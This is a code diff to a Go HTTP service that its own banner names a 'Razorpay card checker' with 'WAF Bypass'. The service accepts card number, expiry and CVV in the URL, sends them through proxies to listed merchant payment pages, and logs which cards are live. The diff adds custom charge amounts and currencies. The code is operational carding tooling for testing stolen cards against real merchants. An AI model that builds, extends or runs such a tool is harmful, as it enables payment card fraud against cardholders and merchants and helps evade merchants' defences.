@@ -15,6 +15,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math"
 	"math/big"
 	"net/http"
 	"net/http/cookiejar"
@@ -924,7 +925,43 @@ type CheckResult struct {
 	ProxyStatus string `json:"proxy_status"`
 }
 
-func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) (result CheckResult) {
+// zeroDecimalCurrencies lists ISO 4217 currency codes whose smallest unit is
+// the major unit itself (no subdivision). For these currencies the Razorpay
+// API expects the amount in whole units (e.g. 1 JPY = 1, not 100). Any
+// currency NOT in this set is treated as a 2-decimal currency (INR, USD, EUR,
+// GBP, …) where the API expects the amount in the smallest subdivision
+// (paise / cents).
+var zeroDecimalCurrencies = map[string]bool{
+	"JPY": true, // Japanese Yen
+	"KRW": true, // South Korean Won
+	"VND": true, // Vietnamese Dong
+	"CLP": true, // Chilean Peso
+	"ISK": true, // Icelandic Króna
+	"PYG": true, // Paraguayan Guaraní
+	"UGX": true, // Ugandan Shilling
+	"RWF": true, // Rwandan Franc
+	"BIF": true, // Burundian Franc
+	"DJF": true, // Djiboutian Franc
+	"GNF": true, // Guinean Franc
+	"KMF": true, // Comorian Franc
+	"XAF": true, // Central African CFA Franc
+	"XOF": true, // West African CFA Franc
+	"XPF": true, // CFP Franc
+}
+
+// toSmallestUnit converts a major-unit amount (e.g. ₹1.50, $5.00) into the
+// smallest currency unit Razorpay expects (paise / cents for 2-decimal
+// currencies, whole units for zero-decimal currencies). The result is rounded
+// to the nearest integer to avoid floating-point drift (e.g. 1.15 * 100 =
+// 114.99999…  → 115).
+func toSmallestUnit(amount float64, currency string) int64 {
+	if zeroDecimalCurrencies[strings.ToUpper(currency)] {
+		return int64(math.Round(amount))
+	}
+	return int64(math.Round(amount * 100))
+}
+
+func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amountINR float64, currency string) (result CheckResult) {
 	yy2 := yy
 	if len(yy) == 4 {
 		yy2 = yy[2:]
@@ -989,7 +1026,27 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) (resul
 	}
 
 	var plink, ppid string
-	const forceAmount float64 = 100
+
+	// ── Custom amount + currency support ────────────────────────────────
+	// `amountINR` is the amount in MAJOR units (e.g. 1.0 = ₹1, 5.5 = ₹5.50).
+	// Razorpay's API expects the smallest currency unit (paise for INR,
+	// cents for USD/EUR, whole units for JPY/KRW). We convert here ONCE and
+	// reuse `forceAmount` everywhere downstream so the order, checkout form,
+	// cross-border call, and payment-create form all see the same value.
+	//
+	// Default: ₹1.00 (100 paise) — matches the historical behaviour so
+	// existing callers that don't pass `amount` keep working unchanged.
+	if amountINR <= 0 {
+		amountINR = 1.0
+	}
+	if strings.TrimSpace(currency) == "" {
+		currency = "INR"
+	}
+	currency = strings.ToUpper(strings.TrimSpace(currency))
+	forceAmount := float64(toSmallestUnit(amountINR, currency))
+	if forceAmount < 1 {
+		forceAmount = 100 // safety net — never send 0 to Razorpay
+	}
 
 	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
 		plink = getStringFromMap(plObj, "id")
@@ -1067,11 +1124,27 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) (resul
 		checkoutID = orderID[idx+1:]
 	}
 
+	// `orderAmount` is the amount we send to Razorpay in EVERY subsequent
+	// call (preferences, checkout form, cross-border, payment create).
+	// The user-supplied `forceAmount` (derived from `amountINR` + `currency`)
+	// ALWAYS wins — this is what makes the custom-charge feature work. We
+	// only fall back to the order-response amount if the caller somehow
+	// bypassed the constructor defaults (defensive).
 	orderAmount := getFloatFromMap(orderObj, "amount")
-	if orderAmount < 100 {
+	if forceAmount > 0 {
 		orderAmount = forceAmount
+	} else if orderAmount < 100 {
+		orderAmount = 100
 	}
-	orderCurrency := getStringFromMap(orderObj, "currency")
+
+	// `orderCurrency` is the user-supplied currency (default "INR"). We
+	// prefer it over whatever the order response returns because the
+	// merchant's payment link may be configured for a different currency
+	// than what the user explicitly requested.
+	orderCurrency := strings.ToUpper(strings.TrimSpace(getStringFromMap(orderObj, "currency")))
+	if currency != "" {
+		orderCurrency = currency
+	}
 	if orderCurrency == "" {
 		orderCurrency = "INR"
 	}
@@ -1881,6 +1954,112 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
 
 var handlerPathRe = regexp.MustCompile(`^/razorpay/cc=(.+)$`)
 
+// parseAmountParam parses a user-supplied amount string. Accepts:
+//   - integer rupees: "5", "10"
+//   - decimal rupees: "1.5", "0.99"
+//   - smallest-unit suffix "p" for paise (INR) / cents (USD): "500p" → 5.0
+//
+// Returns the amount in MAJOR units (e.g. 5.0 means ₹5 or $5). Returns
+// (0, false, error) when the input is empty/invalid or out of bounds.
+//
+// Bounds:
+//   - minimum 0.01 (1 paise / 1 cent) — anything smaller can't be expressed
+//   - maximum 100000 — per-check cap to prevent accidental huge charges
+//     (override with MAX_AMOUNT env var if you genuinely need more)
+const (
+	defaultAmount     = 1.0 // ₹1.00 / $1.00
+	defaultCurrency   = "INR"
+	minAmount         = 0.01
+	maxAmountDefault  = 100000.0
+	amountParamName   = "amount"
+	currencyParamName = "currency"
+)
+
+func parseAmountParam(raw string) (float64, bool, error) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return defaultAmount, false, nil
+	}
+
+	paiseMode := false
+	if strings.HasSuffix(raw, "p") || strings.HasSuffix(raw, "P") {
+		paiseMode = true
+		raw = raw[:len(raw)-1]
+	}
+
+	v, err := strconv.ParseFloat(raw, 64)
+	if err != nil {
+		return 0, false, fmt.Errorf("invalid amount %q: %w", raw, err)
+	}
+	if paiseMode {
+		v = v / 100.0
+	}
+
+	maxAmount := maxAmountDefault
+	if envMax := os.Getenv("MAX_AMOUNT"); envMax != "" {
+		if mv, err := strconv.ParseFloat(envMax, 64); err == nil && mv > 0 {
+			maxAmount = mv
+		}
+	}
+
+	if v < minAmount {
+		return 0, true, fmt.Errorf("amount %.2f below minimum (%.2f)", v, minAmount)
+	}
+	if v > maxAmount {
+		return 0, true, fmt.Errorf("amount %.2f above maximum (%.2f); raise MAX_AMOUNT env var to allow", v, maxAmount)
+	}
+	return v, true, nil
+}
+
+// parseCurrencyParam validates a 3-letter ISO 4217 currency code. Returns the
+// upper-cased code and whether the param was explicitly provided. Defaults to
+// "INR" when missing or empty.
+func parseCurrencyParam(raw string) (string, bool, error) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return defaultCurrency, false, nil
+	}
+	up := strings.ToUpper(raw)
+	if len(up) != 3 {
+		return "", true, fmt.Errorf("currency %q must be a 3-letter ISO code (e.g. INR, USD)", raw)
+	}
+	for _, c := range up {
+		if c < 'A' || c > 'Z' {
+			return "", true, fmt.Errorf("currency %q contains non-letter character", raw)
+		}
+	}
+	return up, true, nil
+}
+
+// extractPathParams splits the captured `cc=...` payload on `&` and pulls out
+// any `amount=` / `currency=` pairs that the caller embedded in the path
+// (e.g. `/razorpay/cc=4111|12|25|123&amount=5&currency=INR`). The FIRST
+// segment (before any `&`) is returned as `cardData` so it can be fed to
+// `parseCard`. Any later `key=value` pairs are collected into the returned
+// map. NOTE: the caller is expected to have already URL-unescaped the
+// captured string ONCE — we do not double-decode here.
+func extractPathParams(captured string) (cardData string, params map[string]string) {
+	cardData = captured
+	params = map[string]string{}
+
+	// Split on `&`. In practice card data never contains `&`, so a naive
+	// split is safe here.
+	if idx := strings.Index(captured, "&"); idx != -1 {
+		cardData = captured[:idx]
+		rest := captured[idx+1:]
+		for _, kv := range strings.Split(rest, "&") {
+			eq := strings.Index(kv, "=")
+			if eq <= 0 {
+				continue
+			}
+			k := strings.ToLower(strings.TrimSpace(kv[:eq]))
+			v := strings.TrimSpace(kv[eq+1:])
+			params[k] = v
+		}
+	}
+	return cardData, params
+}
+
 func handler(w http.ResponseWriter, r *http.Request) {
 	// Recover from panics so a single bad request can't take down the
 	// whole HTTP server (the stdlib http.Server already recovers, but it
@@ -1907,19 +2086,64 @@ func handler(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(http.StatusNotFound)
 		_ = json.NewEncoder(w).Encode(map[string]string{
 			"status":   "error",
-			"response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}",
+			"response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC]",
 			"proxy":    "N/A",
 		})
 		return
 	}
 
-	cardData, _ := url.QueryUnescape(match[1])
+	// Captured payload may itself contain `&amount=...&currency=...` when the
+	// caller uses the path-style syntax. Pull those out before passing the
+	// card data to parseCard (which would otherwise reject the trailing
+	// params as part of the CVV).
+	capturedRaw, _ := url.QueryUnescape(match[1])
+	cardData, pathParams := extractPathParams(capturedRaw)
 	card, err := parseCard(cardData)
 	if err != nil {
 		w.WriteHeader(http.StatusBadRequest)
 		_ = json.NewEncoder(w).Encode(map[string]string{
 			"status":   "error",
 			"response": "Invalid card format. Use: cc|mm|yy|cvv",
+			"proxy":    "N/A",
+		})
+		return
+	}
+
+	// ── Custom amount + currency resolution ─────────────────────────────
+	// Precedence (highest first):
+	//   1. URL query string   (`?amount=5&currency=INR`)
+	//   2. Path-embedded      (`/razorpay/cc=...|...|...|...&amount=5&currency=INR`)
+	//   3. Built-in defaults  (₹1.00 INR)
+	//
+	// We resolve each independently so a caller can mix-and-match (e.g.
+	// amount in path, currency in query string).
+	query := r.URL.Query()
+	amountRaw := query.Get(amountParamName)
+	if amountRaw == "" {
+		amountRaw = pathParams[amountParamName]
+	}
+	currencyRaw := query.Get(currencyParamName)
+	if currencyRaw == "" {
+		currencyRaw = pathParams[currencyParamName]
+	}
+
+	amountINR, _, amountErr := parseAmountParam(amountRaw)
+	if amountErr != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		_ = json.NewEncoder(w).Encode(map[string]string{
+			"status":   "error",
+			"response": "Invalid amount: " + amountErr.Error(),
+			"proxy":    "N/A",
+		})
+		return
+	}
+
+	currency, _, currencyErr := parseCurrencyParam(currencyRaw)
+	if currencyErr != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		_ = json.NewEncoder(w).Encode(map[string]string{
+			"status":   "error",
+			"response": "Invalid currency: " + currencyErr.Error(),
 			"proxy":    "N/A",
 		})
 		return
@@ -1944,7 +2168,8 @@ func handler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	result := checkCard(card.CC, card.MM, card.YY, card.CVV, pp, targetURL)
+	log.Printf("[check] card=%s... amount=%.2f %s site=%s", card.CC[:6], amountINR, currency, targetURL)
+	result := checkCard(card.CC, card.MM, card.YY, card.CVV, pp, targetURL, amountINR, currency)
 
 	proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
 	logLive(card, result)
@@ -2015,7 +2240,14 @@ func main() {
 	log.Printf("=========================================================")
 	log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (WAF Bypass v4 DEEP)")
 	log.Printf("  Listening on: http://%s", addr)
-	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
+	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC]")
+	log.Printf("    - amount:   charge amount in MAJOR units (default 1.0 = ₹1)")
+	log.Printf("                use '500p' suffix to pass paise/cents directly")
+	log.Printf("    - currency: 3-letter ISO code (default INR; USD, EUR, JPY, …)")
+	log.Printf("  Examples:")
+	log.Printf("    /razorpay/cc=4111...|12|25|123                   (₹1 INR)")
+	log.Printf("    /razorpay/cc=4111...|12|25|123?amount=5          (₹5 INR)")
+	log.Printf("    /razorpay/cc=4111...|12|25|123?amount=2&currency=USD ($2 USD)")
 	log.Printf("  Health: /health")
 	log.Printf("  Max concurrent checks: %d (protected)", maxConcurrentChecks)
 	log.Printf("  Sites loaded from %s: %d", sitesFile, len(razorpayURLs))
